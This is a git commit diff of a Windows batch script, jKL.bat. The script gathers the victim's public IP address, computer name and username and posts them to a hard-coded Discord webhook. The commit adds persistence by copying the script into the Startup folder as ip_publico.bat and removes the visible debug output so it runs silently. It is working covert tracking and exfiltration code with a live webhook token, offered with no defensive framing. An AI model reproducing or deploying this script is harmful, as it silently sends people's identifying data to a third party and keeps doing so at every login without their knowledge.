d04d3723bb38fe4e97a69c76685e78108c512071
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-04 16:08:59 -0300

    Update jKL.bat

--- jKL.bat
+++ jKL.bat
@@ -1,16 +1,18 @@
 @echo off
+
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+if /I not "%~f0"=="%STARTUP%\ip_publico.bat" copy "%~f0" "%STARTUP%\ip_publico.bat" >nul
+
 setlocal
 
 :: Pega IP público
 for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
 
-:: Debug (opcional – pode apagar depois)
-echo IP=%IP%
-pause
+:: Tempo mínimo pra não matar o curl
+ping 127.0.0.1 -n 2 >nul
 
 set PC=%COMPUTERNAME%
 set USER=%USERNAME%
-
 set MESSAGE=PC %PC% - Usuario %USER% - IP publico %IP%
 
 curl -s ^
@@ -19,4 +21,5 @@ curl -s ^
 -d "{\"content\":\"%MESSAGE%\"}" ^
 https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK
 
+endlocal
 exit
